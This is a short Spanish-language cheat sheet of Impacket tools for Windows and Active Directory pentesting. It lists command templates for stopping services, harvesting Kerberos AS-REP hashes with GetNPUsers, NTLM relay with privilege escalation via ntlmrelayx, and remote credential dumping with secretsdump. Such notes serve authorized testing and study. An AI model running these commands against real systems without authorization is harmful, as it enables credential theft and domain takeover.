# impacket

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

{% hint style="info" %}
Ubicación: /usr/share/doc/python3-impacket/examples/
{% endhint %}

* **services.py**: Realiza operaciones contra los servicios de Windows.
  * list: Lista los servicios disponibles y su estado
  * stop: Detiene un servicio en particular
  * start: Inicia el servicio

```
services.py dominio/usuario:password comando
services.py dominio/usuario:password list
services.py dominio/usuario:password stop -name dns
```

* **GetNPUsers.py:** Obiene los hash de TGTs **(**ticket-granting ticket), de **kerberos**, _**sin requerir**_ _**autenticación**_.

```bash
GetNPUsers <dominio>/usuario[:password]
GetNPUsers <dominio>/ -usersfile <file.txt> -format <hashcat>|john> -dc-ip <IP> -outputfile out.txt
```

#### impacket-ntlmrelayx ([https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py))

> Realiza ataques de relay SMB. Intenta autenticar el cliente contra nosotros. Invoca SMB y HTTP,  hoockeando algunas funciones y usa algunos protocolos en el cliente (Samba,LDAP).&#x20;
>
> Si la autenticación es exitosa, entonces establece un servidor SMB.

```bash
impacket-ntlmrelayx -t ldap://<IP> --escalate-user <usuario>
```

#### impacket-secretsdump

> Realiza varias tecnicas para dumpear los hashes desde una maquina remota sin ejecutar ninún agente.

```bash
impacket-secretsdump <dominio>/<usuario>:<[password]>@<IP> -outputfile archivosalida.txt -just-dc-user <usuario que se desea extraer>
```
